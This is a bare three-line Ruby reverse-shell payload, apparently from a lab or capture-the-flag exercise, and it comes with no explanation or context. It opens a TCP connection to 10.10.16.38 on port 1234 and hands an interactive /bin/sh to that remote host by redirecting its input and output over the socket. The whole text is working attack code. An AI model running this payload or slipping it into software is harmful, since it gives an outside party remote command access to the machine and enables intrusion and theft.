require 'socket'
f=TCPSocket.open("10.10.16.38",1234).to_i;
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
